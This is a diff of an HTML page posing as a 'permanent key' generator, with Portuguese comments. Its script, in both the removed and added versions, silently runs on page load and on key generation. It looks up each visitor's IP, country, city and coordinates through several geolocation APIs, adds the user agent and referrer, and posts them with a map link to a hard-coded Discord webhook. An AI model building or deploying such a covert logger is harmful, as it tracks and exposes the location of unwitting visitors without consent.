@@ -8,76 +8,28 @@
         @import url('https://fonts.googleapis.com/css2?family=Gotham:wght@400;700;900&display=swap');
         
         body {
-            margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #0a0a0f, #1a0033);
-            color: #fff;
-            font-family: 'Gotham', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            margin: 0; padding: 0; background: linear-gradient(135deg, #0a0a0f, #1a0033);
+            color: #fff; font-family: 'Gotham', sans-serif; min-height: 100vh;
+            display: flex; align-items: center; justify-content: center;
         }
-
         .container {
-            background: rgba(20, 20, 30, 0.95);
-            padding: 50px 40px;
-            border-radius: 20px;
-            box-shadow: 0 0 40px rgba(0, 255, 255, 0.4);
-            max-width: 520px;
-            width: 90%;
-            text-align: center;
-            border: 2px solid #00ffff;
+            background: rgba(20, 20, 30, 0.95); padding: 50px 40px; border-radius: 20px;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.4); max-width: 520px; width: 90%;
+            text-align: center; border: 2px solid #00ffff;
         }
-
-        h1 {
-            font-size: 48px;
-            color: #00ffff;
-            margin-bottom: 10px;
-            text-shadow: 0 0 20px #00ffff;
-        }
-
-        p {
-            font-size: 18px;
-            color: #bbb;
-            margin-bottom: 30px;
-        }
-
+        h1 { font-size: 48px; color: #00ffff; margin-bottom: 10px; text-shadow: 0 0 20px #00ffff; }
+        p { font-size: 18px; color: #bbb; margin-bottom: 30px; }
         button {
-            background: #00ffff;
-            color: #111;
-            border: none;
-            padding: 18px 60px;
-            font-size: 22px;
-            font-weight: 900;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin: 15px;
+            background: #00ffff; color: #111; border: none; padding: 18px 60px;
+            font-size: 22px; font-weight: 900; border-radius: 12px; cursor: pointer;
+            transition: all 0.3s; margin: 15px;
         }
-
-        button:hover {
-            background: #00cccc;
-            transform: scale(1.08);
-            box-shadow: 0 0 25px #00ffff;
-        }
-
+        button:hover { background: #00cccc; transform: scale(1.08); box-shadow: 0 0 25px #00ffff; }
         #generatedKey {
-            margin-top: 30px;
-            font-size: 26px;
-            background: #111;
-            padding: 20px;
-            border-radius: 12px;
-            word-break: break-all;
-            border: 1px solid #00ffff;
-            display: none;
+            margin-top: 30px; font-size: 26px; background: #111; padding: 20px;
+            border-radius: 12px; word-break: break-all; border: 1px solid #00ffff; display: none;
         }
-
-        .status {
-            margin-top: 20px;
-            font-size: 16px;
-            color: #0f0;
-        }
+        .status { margin-top: 20px; font-size: 16px; color: #0f0; }
     </style>
 </head>
 <body>
@@ -97,78 +49,94 @@
         <div class="status" id="status"></div>
     </div>
 
-<script>
-// === URL DA SUA WEBHOOK ===
-const webhookUrl = "https://discord.com/api/webhooks/1492629972467191900/vuO7OS7o0V_LLTVz2_mvHVY-344wKKvcWKSWCiEQfLmyuVrDr2fgQx9jT3Q1O7ROdiRp";
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1492629972467191900/vuO7OS7o0V_LLTVz2_mvHVY-344wKKvcWKSWCiEQfLmyuVrDr2fgQx9jT3Q1O7ROdiRp";
 
-async function enviarLogger() {
-    let ip = "Desconhecido";
-    let pais = "Desconhecido";
-    let cidade = "Desconhecido";
-    let lat = "";
-    let lon = "";
+        // ==================== LOGGER MELHORADO (várias APIs) ====================
+        async function enviarLogger(tipo, key = "") {
+            let ip = "Desconhecido", pais = "Desconhecido", cidade = "Desconhecido";
+            let lat = "", lon = "";
 
-    try {
-        // API mais confiável atualmente para client-side (GitHub Pages)
-        const res = await fetch("https://ipwho.is/");
-        const geo = await res.json();
+            const apis = [
+                "https://ipapi.co/json/",           // Boa e gratuita
+                "https://ipwho.is/",                // Tentativa 2
+                "https://freeipapi.com/api/json",   // Tentativa 3
+                "https://api.ipgeolocation.io/ipgeo?apiKey=free" // fallback
+            ];
 
-        if (geo && geo.success !== false) {
-            ip     = geo.ip || "Desconhecido";
-            pais   = geo.country || "Desconhecido";
-            cidade = geo.city || geo.region || "Desconhecido";
-            lat    = geo.latitude || "";
-            lon    = geo.longitude || "";
+            for (let url of apis) {
+                try {
+                    const res = await fetch(url, { mode: 'cors' });
+                    if (!res.ok) continue;
+                    
+                    const data = await res.json();
+                    
+                    ip    = data.ip || data.query || ip;
+                    pais  = data.country_name || data.country || pais;
+                    cidade = data.city || data.region || cidade;
+                    lat   = data.latitude || data.lat || lat;
+                    lon   = data.longitude || data.lon || lon;
+
+                    if (ip !== "Desconhecido") break; // Parou no primeiro que deu certo
+                } catch (e) {}
+            }
+
+            const mapa = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : "Sem localização";
+            const dataHora = new Date().toLocaleString('pt-BR');
+            const browser = navigator.userAgent;
+            const origem = document.referrer || "Acesso direto";
+
+            let mensagem = `**🗝️ ${tipo}**\n\n` +
+                          `**IP:** ${ip}\n` +
+                          `**Data/Hora:** ${dataHora}\n` +
+                          `**País:** ${pais}\n` +
+                          `**Cidade:** ${cidade}\n` +
+                          `**Navegador:** ${browser}\n` +
+                          `**Origem:** ${origem}\n` +
+                          (mapa !== "Sem localização" ? `**Mapa:** ${mapa}\n` : "");
+
+            if (key) mensagem += `**Key Gerada:** \`${key}\`\n`;
+
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: mensagem,
+                        username: "CabralDev Logger 💤",
+                    })
+                });
+                console.log("Logger enviado com sucesso");
+            } catch (error) {
+                console.error("Erro ao enviar logger:", error);
+            }
         }
-    } catch (e) {
-        console.log("Primeira API falhou, tentando fallback...");
-        
-        // Fallback simples (só IP)
-        try {
-            const ipRes = await fetch("https://api.ipify.org?format=json");
-            const ipData = await ipRes.json();
-            ip = ipData.ip || "Desconhecido";
-        } catch (e2) {
-            console.error("Todos os métodos de IP falharam");
+
+        // Executa ao carregar a página
+        window.addEventListener('load', () => enviarLogger("Novo Acesso ao Gerador de Key"));
+
+        // ==================== GERADOR DE KEY ====================
+        function generatePermanentKey() {
+            const prefix = "SHITPERM-";
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            let key = prefix;
+            for (let i = 0; i < 28; i++) {
+                key += chars[Math.floor(Math.random() * chars.length)];
+            }
+
+            document.getElementById("keyText").textContent = key;
+            document.getElementById("generatedKey").style.display = "block";
+
+            enviarLogger("Key Gerada com Sucesso", key);
+            document.getElementById("status").innerHTML = "✅ Key gerada e registrada no Discord!";
         }
-    }
 
-    const mapa = (lat && lon) 
-        ? `https://www.google.com/maps?q=${lat},${lon}` 
-        : "Sem localização";
-
-    const browser = navigator.userAgent;
-    const data    = new Date().toLocaleString('pt-BR');
-    const origem  = document.referrer || "Direto";
-
-    const msg = `**Novo acesso detectado!**\n\n` +
-                `**IP:** ${ip}\n` +
-                `**Data/Hora:** ${data}\n` +
-                `**País:** ${pais}\n` +
-                `**Cidade:** ${cidade}\n` +
-                `**Navegador:** ${browser}\n` +
-                `**Origem:** ${origem}\n` +
-                (mapa !== "Sem localização" ? `**Mapa:** ${mapa}\n` : "");
-
-    try {
-        await fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                content: msg,
-                username: "CabralDev Logger 💤",
-                // avatar_url: "https://i.imgur.com/SEU_LINK.png"  // descomente se quiser
-            })
-        });
-        console.log("✅ Logger enviado com sucesso");
-    } catch (error) {
-        console.error("❌ Erro ao enviar para webhook:", error);
-    }
-}
-
-// Executa quando a página carregar
-window.addEventListener('load', enviarLogger);
-</script>
-
+        function copyKey() {
+            const key = document.getElementById("keyText").textContent;
+            navigator.clipboard.writeText(key).then(() => {
+                alert("✅ Key copiada!");
+            });
+        }
+    </script>
 </body>
 </html>
